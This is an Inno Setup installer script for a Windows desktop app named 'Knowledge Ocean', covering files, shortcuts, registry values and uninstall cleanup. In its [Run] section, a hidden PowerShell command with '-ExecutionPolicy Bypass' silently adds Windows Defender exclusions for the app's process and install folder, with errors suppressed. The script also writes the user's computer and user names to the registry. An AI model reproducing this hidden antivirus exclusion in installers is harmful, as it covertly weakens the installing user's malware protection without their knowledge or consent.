; ═══════════════════════════════════════════════════════════════════════════
;  🌊 Inno Setup Script: Knowledge Ocean Desktop
;  Developed for ABDULSALAM S. HASAN
; ═══════════════════════════════════════════════════════════════════════════

#define MyAppName "Knowledge Ocean"
#define MyAppVersion "9.5.0"
#define MyAppPublisher "ABDULSALAM S. HASAN"
#define MyAppURL "https://huggingface.co/spaces/abood8824/Knowledge_Ocean"
#define MyAppExeName "KnowledgeOcean.exe"

[Setup]
AppId={{D5E8C941-8F32-4740-9E39-F024BB1797DA}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}
DefaultDirName={autopf}\KnowledgeOcean
DefaultGroupName=Knowledge Ocean
AllowNoIcons=yes
OutputDir=installer_dist
OutputBaseFilename=KnowledgeOcean_Setup
SetupIconFile=static\app_icon.ico
UninstallDisplayIcon={app}\static\app_icon.ico
Compression=lzma2/ultra64
SolidCompression=yes
WizardStyle=modern
PrivilegesRequired=lowest
PrivilegesRequiredOverridesAllowed=dialog commandline
ArchitecturesInstallIn64BitMode=x64compatible
DisableProgramGroupPage=no
DisableDirPage=no

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"
Name: "arabic"; MessagesFile: "compiler:Languages\Arabic.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: checkedonce

[Files]
Source: "dist\KnowledgeOcean\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "templates\*"; DestDir: "{app}\templates"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "static\*"; DestDir: "{app}\static"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "fonts\*"; DestDir: "{app}\fonts"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "config.txt"; DestDir: "{app}"; Flags: ignoreversion
Source: "hero.jpg"; DestDir: "{app}"; Flags: ignoreversion
Source: "media_security.py"; DestDir: "{app}"; Flags: ignoreversion skipifsourcedoesntexist
Source: "media_dongle.sig"; DestDir: "{app}"; Flags: ignoreversion skipifsourcedoesntexist

[InstallDelete]
Type: files; Name: "{autodesktop}\محيط المعرفة.lnk"
Type: files; Name: "{autodesktop}\محيط المعرفة (Knowledge Ocean).lnk"
Type: files; Name: "{userdesktop}\محيط المعرفة.lnk"
Type: files; Name: "{userdesktop}\محيط المعرفة (Knowledge Ocean).lnk"
Type: files; Name: "{commondesktop}\محيط المعرفة.lnk"
Type: files; Name: "{commondesktop}\محيط المعرفة (Knowledge Ocean).lnk"
Type: filesandordirs; Name: "{userprograms}\محيط المعرفة (Knowledge Ocean)"
Type: filesandordirs; Name: "{commonprograms}\محيط المعرفة (Knowledge Ocean)"

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\static\app_icon.ico"
Name: "{group}\{cm:UninstallProgram,{#MyAppName}}"; Filename: "{uninstallexe}"
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\static\app_icon.ico"

[Registry]
Root: HKCU; Subkey: "Software\KnowledgeOcean"; ValueType: string; ValueName: "InstallPath"; ValueData: "{app}"; Flags: uninsdeletekey
Root: HKCU; Subkey: "Software\KnowledgeOcean"; ValueType: string; ValueName: "AppId"; ValueData: "{{D5E8C941-8F32-4740-9E39-F024BB1797DA}"; Flags: uninsdeletekey
Root: HKCU; Subkey: "Software\KnowledgeOcean"; ValueType: string; ValueName: "ComputerName"; ValueData: "{computername}"; Flags: uninsdeletekey
Root: HKCU; Subkey: "Software\KnowledgeOcean"; ValueType: string; ValueName: "UserName"; ValueData: "{username}"; Flags: uninsdeletekey
Root: HKCU; Subkey: "Software\KnowledgeOcean"; ValueType: string; ValueName: "Version"; ValueData: "{#MyAppVersion}"; Flags: uninsdeletekey


[UninstallRun]
Filename: "{cmd}"; Parameters: "/C taskkill /F /IM KnowledgeOcean.exe /T"; Flags: runhidden

[UninstallDelete]
Type: filesandordirs; Name: "{app}\_internal"
Type: filesandordirs; Name: "{app}\templates"
Type: filesandordirs; Name: "{app}\static"
Type: filesandordirs; Name: "{app}\fonts"
Type: filesandordirs; Name: "{app}\pdf_cache"
Type: filesandordirs; Name: "{app}\FullText_PDFs"
Type: files; Name: "{app}\desktop_app.log"
Type: files; Name: "{app}\KnowledgeOcean.exe"
Type: files; Name: "{app}\hero.jpg"
Type: files; Name: "{app}\config.txt"
Type: files; Name: "{app}\*.pdf"
Type: files; Name: "{app}\*.txt"
Type: files; Name: "{app}\*.csv"

[Run]
Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionProcess '{#MyAppExeName}' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '{app}' -ErrorAction SilentlyContinue"""; Flags: runhidden
Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
